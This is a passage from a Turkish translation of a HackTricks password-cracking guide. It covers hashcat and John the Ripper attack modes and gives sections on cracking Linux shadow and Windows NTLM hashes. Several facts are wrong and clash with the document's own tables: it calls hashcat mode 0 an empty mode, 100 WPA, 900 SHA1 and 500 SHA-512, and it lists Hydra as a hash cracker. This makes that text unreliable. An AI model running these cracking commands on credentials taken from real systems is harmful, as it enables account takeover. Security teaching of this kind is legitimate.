hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt -j $- -k $!
```
* **Maske saldırısı** (`-a 3`)
```bash
# Mask attack with simple mask
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt ?u?l?l?l?l?l?l?l?d

hashcat --help #will show the charsets and are as follows
? | Charset
===+=========
l | abcdefghijklmnopqrstuvwxyz
u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
d | 0123456789
h | 0123456789abcdef
H | 0123456789ABCDEF
s | !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
a | ?l?u?d?s
b | 0x00 - 0xff

# Mask attack declaring custom charset
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt -1 ?d?s ?u?l?l?l?l?l?l?l?1
## -1 ?d?s defines a custom charset (digits and specials).
## ?u?l?l?l?l?l?l?l?1 is the mask, where "?1" is the custom charset.

# Mask attack with variable password length
## Create a file called masks.hcmask with this content:
?d?s,?u?l?l?l?l?1
?d?s,?u?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?l?1
## Use it to crack the password
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt .\masks.hcmask
```
* Wordlist + Mask (`-a 6`) / Mask + Wordlist (`-a 7`) saldırısı
```bash
# Mask numbers will be appended to each word in the wordlist
hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d

# Mask numbers will be prepended to each word in the wordlist
hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
```
#### Hashcat modları

Hashcat, çeşitli şifre kırma modlarıyla kullanılabilir. Aşağıda, Hashcat'in desteklediği bazı temel modlar açıklanmaktadır:

- **0**: Boş mod. Bu mod, Hashcat'in hiçbir şifre kırma işlemi yapmadığı anlamına gelir.
- **100**: WPA/WPA2 modu. Bu mod, WPA veya WPA2 şifrelerini kırmak için kullanılır.
- **2500**: WPA/WPA2 PMKID modu. Bu mod, WPA veya WPA2 PMKID'leri kırmak için kullanılır.
- **3000**: LM modu. Bu mod, Windows LM hash'lerini kırmak için kullanılır.
- **500**: MD5 modu. Bu mod, MD5 hash'leri kırmak için kullanılır.
- **900**: SHA1 modu. Bu mod, SHA1 hash'leri kırmak için kullanılır.
- **1000**: NTLM modu. Bu mod, Windows NTLM hash'leri kırmak için kullanılır.
- **1400**: SHA256 modu. Bu mod, SHA256 hash'leri kırmak için kullanılır.
- **1700**: SHA512 modu. Bu mod, SHA512 hash'leri kırmak için kullanılır.

Bu sadece bazı temel modlardır ve Hashcat, farklı hash algoritmalarını ve şifreleme yöntemlerini destekleyen daha fazla mod sunar.
```bash
hashcat --example-hashes | grep -B1 -A2 "NTLM"
```
# Linux Hashleri Kırma - /etc/shadow Dosyası

Linux sistemlerde kullanıcı parolaları `/etc/shadow` dosyasında saklanır. Bu dosya, kullanıcı adları ve parolalarıyla ilgili hash değerlerini içerir. Bu bölümde, `/etc/shadow` dosyasındaki hash değerlerini kırmak için kullanılan bazı yöntemleri öğreneceksiniz.

## 1. Brute Force Saldırısı

Brute force saldırısı, tüm olası kombinasyonları deneyerek doğru parolayı bulmaya çalışan bir saldırı türüdür. Linux hashlerini kırmak için brute force saldırısı kullanabilirsiniz. Bu saldırı türü, bir wordlist (kelime listesi) veya karakter seti kullanarak parola tahminlerinde bulunur.

### Wordlist Kullanarak Brute Force

Wordlist tabanlı brute force saldırısı, önceden oluşturulmuş bir kelime listesini kullanarak parola tahminlerinde bulunur. Bu kelime listesi, yaygın kullanılan parolaları, sözlük kelimelerini ve diğer olası parola kombinasyonlarını içerir.

```bash
$ john --wordlist=wordlist.txt hash.txt
```

### Karakter Seti Kullanarak Brute Force

Karakter seti tabanlı brute force saldırısı, belirli bir karakter setini kullanarak parola tahminlerinde bulunur. Bu saldırı türü, belirli bir uzunlukta tüm kombinasyonları deneyerek parolayı bulmaya çalışır.

```bash
$ john --incremental hash.txt
```

## 2. Rainbow Table Saldırısı

Rainbow table saldırısı, önceden hesaplanmış hash değerlerini içeren bir tabloyu kullanarak parolaları kırmaya çalışır. Bu tablo, hash değerleri ve bunlara karşılık gelen orijinal parolaları içerir. Rainbow table saldırısı, brute force saldırısına göre daha hızlıdır, ancak daha fazla depolama alanı gerektirir.

```bash
$ rcracki_mt -h hash.txt -t rainbow_table.rt
```

## 3. GPU Tabanlı Saldırılar

GPU tabanlı saldırılar, grafik işlemcilerin (GPU) paralel hesaplama yeteneklerini kullanarak hash değerlerini kırmaya çalışır. Bu saldırı türü, brute force veya rainbow table saldırılarını hızlandırmak için kullanılabilir.

```bash
$ hashcat -m 500 hash.txt wordlist.txt
```

Yukarıdaki komut, hashcat aracını kullanarak brute force saldırısı yapar. `-m 500` parametresi, Linux SHA-512 hashlerini belirtir.

## 4. Online Hash Kırma Servisleri

Bazı çevrimiçi hash kırma servisleri, hash değerlerini kırmak için bulut tabanlı hesaplama gücünü kullanır. Bu servisler, kullanıcıların hash değerlerini yüklemelerine ve kırılmış parolaları alabilmelerine olanak tanır.

- [CrackStation](https://crackstation.net/)
- [HashKiller](https://hashkiller.co.uk/)
- [OnlineHashCrack](https://www.onlinehashcrack.com/)

Bu servisler, güvenlik ve gizlilik açısından dikkatli kullanılmalıdır. Hash değerlerinizin üçüncü taraflar tarafından ele geçirilme riski olduğunu unutmayın.

## 5. Parola Yeniden Ayarlama

Eğer root erişimine sahipseniz, `/etc/shadow` dosyasındaki hash değerlerini kırmak yerine parolaları sıfırlayabilirsiniz. Bu, kullanıcıların parolalarını yeniden ayarlamalarını gerektirir.

```bash
$ passwd username
```

Yukarıdaki komutu kullanarak, belirli bir kullanıcının parolasını sıfırlayabilirsiniz. `username` parametresini hedef kullanıcının adıyla değiştirin.

## 6. Diğer Yöntemler

Linux hashlerini kırmak için başka yöntemler de mevcuttur. Bunlar, hash türüne, sistem yapılandırmasına ve kullanılabilir kaynaklara bağlı olarak değişebilir. Ayrıca, hash cracking araçlarının belirli bir hash türünü destekleyip desteklemediğini kontrol etmek önemlidir.

Bu bölümde, Linux sistemlerdeki `/etc/shadow` dosyasındaki hash değerlerini kırmak için kullanılan bazı genel yöntemleri öğrendiniz. Ancak, unutmayın ki hash kırma işlemi yasa dışı olabilir ve yalnızca yasal izinlerle gerçekleştirilmelidir.
```
500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
```
# Windows Hash'lerini Kırmak

Windows işletim sistemlerinde kullanılan parola hash'lerini kırmak, bir hedefin parolasını elde etmek için yaygın bir yöntemdir. Bu bölümde, Windows hash'lerini kırmak için kullanılan bazı teknikleri öğreneceksiniz.

## 1. Brute Force Saldırıları

Brute force saldırıları, tüm olası kombinasyonları deneyerek parola hash'ini kırmaya çalışan saldırı türleridir. Bu saldırılar, güçlü bir hesap parolası kullanılmadığında oldukça etkili olabilir.

### 1.1. Wordlist Tabanlı Brute Force

Wordlist tabanlı brute force saldırıları, önceden oluşturulmuş bir kelime listesini kullanarak parola hash'ini kırmayı amaçlar. Bu yöntem, kullanıcıların yaygın olarak kullandığı veya tahmin edilebilecek parolaları hedef alır.

Örnek komut:

```plaintext
hashcat -m <hash_type> <hash_file> <wordlist_file>
```

### 1.2. Mask Tabanlı Brute Force

Mask tabanlı brute force saldırıları, belirli bir desene dayalı olarak parola hash'ini kırmayı amaçlar. Bu yöntem, kullanıcının parola oluşturma alışkanlıklarını tahmin etmek için kullanılabilir.

Örnek komut:

```plaintext
hashcat -m <hash_type> <hash_file> -a 3 '?l?l?l?l?l?l?l'
```

## 2. Rainbow Tabloları

Rainbow tabloları, önceden hesaplanmış parola hash'lerinin depolandığı ve hızlı bir şekilde eşleştirme yapılmasını sağlayan tablolardır. Bu yöntem, brute force saldırılarından daha hızlı sonuçlar elde etmek için kullanılabilir.

Örnek komut:

```plaintext
rtgen <options> <output_file> <input_file>
```

## 3. Parola Kırma Araçları

Parola kırma araçları, Windows hash'lerini kırmak için kullanılan özel yazılımlardır. Bu araçlar, farklı saldırı yöntemlerini destekleyerek daha hızlı ve etkili bir şekilde parola hash'lerini kırabilir.

Örnek araçlar:

- Hashcat
- John the Ripper
- Cain & Abel

Bu teknikleri kullanarak Windows hash'lerini kırabilir ve hedefin parolasını elde edebilirsiniz. Ancak, bu işlem yasa dışı olabilir ve yalnızca yasal izinlerle gerçekleştirilmelidir.
```
3000 | LM                                               | Operating-Systems
1000 | NTLM                                             | Operating-Systems
```
# Ortak Uygulama Hash'lerini Kırmak

Bir uygulamanın kimlik doğrulama işlemi sırasında kullanılan hash algoritması, saldırganlar için bir zayıflık olabilir. Bu bölümde, yaygın olarak kullanılan uygulama hash'lerini kırmak için kullanılan bazı teknikleri ele alacağız.

## 1. Brute Force Saldırıları

Brute force saldırıları, tüm olası kombinasyonları deneyerek hash'i kırmayı amaçlar. Bu saldırı türü, zayıf veya tahmin edilebilir parolalar kullanıldığında etkili olabilir. Saldırganlar, genellikle yaygın parola listeleri veya özel olarak oluşturulmuş parola kombinasyonları kullanarak bu saldırıyı gerçekleştirir.

## 2. Sözlük Saldırıları

Sözlük saldırıları, belirli bir sözlük dosyasındaki kelimeleri veya kelime kombinasyonlarını kullanarak hash'i kırmayı amaçlar. Saldırganlar, genellikle yaygın parola listelerini veya özel olarak oluşturulmuş sözlük dosyalarını kullanır. Bu saldırı türü, kullanıcıların zayıf veya yaygın parolalar kullanma eğiliminde olduğu durumlarda etkili olabilir.

## 3. Rainbow Table Saldırıları

Rainbow table saldırıları, önceden hesaplanmış hash değerlerini içeren bir tabloyu kullanarak hash'i kırmayı amaçlar. Saldırganlar, genellikle büyük bir veritabanı olan rainbow table'ları kullanır. Bu tablolar, hash değerlerini ve bunlara karşılık gelen orijinal metinleri içerir. Saldırganlar, hedef hash'i tabloda aratarak orijinal metni elde etmeye çalışır.

## 4. Parola Çalma Saldırıları

Parola çalma saldırıları, kullanıcıların parolalarını doğrudan ele geçirmeyi amaçlar. Saldırganlar, kullanıcıların parolalarını çalmak için çeşitli yöntemler kullanabilir, örneğin phishing, keylogger veya sosyal mühendislik gibi teknikler.

## 5. GPU Hızlandırma

GPU hızlandırma, grafik işlemcilerin (GPU'lar) paralel işleme yeteneklerini kullanarak hash kırma sürecini hızlandırır. Saldırganlar, özel olarak tasarlanmış GPU tabanlı hash kırma araçlarını kullanarak hash'leri daha hızlı bir şekilde kırabilir.

## 6. Hash Kırma Araçları

Hash kırma araçları, farklı hash algoritmalarını kırmak için kullanılan yazılımlardır. Bu araçlar, brute force, sözlük saldırıları, rainbow table saldırıları ve diğer teknikleri destekleyebilir. Örnek olarak, John the Ripper, Hashcat ve Hydra gibi popüler hash kırma araçları bulunmaktadır.

Hash kırma işlemi, hash algoritmasının karmaşıklığına, kullanılan donanıma ve saldırganın kaynaklarına bağlı olarak değişebilir. Güçlü ve karmaşık parolalar kullanmak, hash kırma saldırılarına karşı korunmanın en iyi yollarından biridir.
```
900 | MD4                                              | Raw Hash
0 | MD5                                              | Raw Hash
5100 | Half MD5                                         | Raw Hash
100 | SHA1                                             | Raw Hash
10800 | SHA-384                                          | Raw Hash
1400 | SHA-256                                          | Raw Hash
1700 | SHA-512                                          | Raw Hash
```
<details>

<summary><strong>Sıfırdan kahraman olmak için AWS hacklemeyi öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek** veya **HackTricks'i PDF olarak indirmek** isterseniz [**ABONELİK PLANLARI'na**](https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'ı takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Dünyanın en gelişmiş topluluk araçları tarafından desteklenen **iş akışlarını kolayca oluşturmak ve otomatikleştirmek** için [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)'i kullanın.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
